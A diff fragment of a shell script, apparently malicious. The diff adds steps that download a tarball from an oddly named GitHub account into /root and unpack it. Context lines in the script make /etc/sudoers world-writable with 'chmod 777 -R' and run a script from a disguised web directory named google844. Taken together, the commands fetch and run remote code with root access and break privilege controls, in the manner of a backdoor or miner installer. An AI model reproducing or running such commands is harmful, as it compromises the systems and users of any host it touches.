@@ -28,6 +28,12 @@ wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/mast
 
 chmod 777 -R /etc/sudoers
 
+cd /root/
+
+wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linuxroot84.tar.gz
+
+tar -xvf ./linuxroot84.tar.gz
+
 cd /var/www/html/google844
 
 bash ./google844
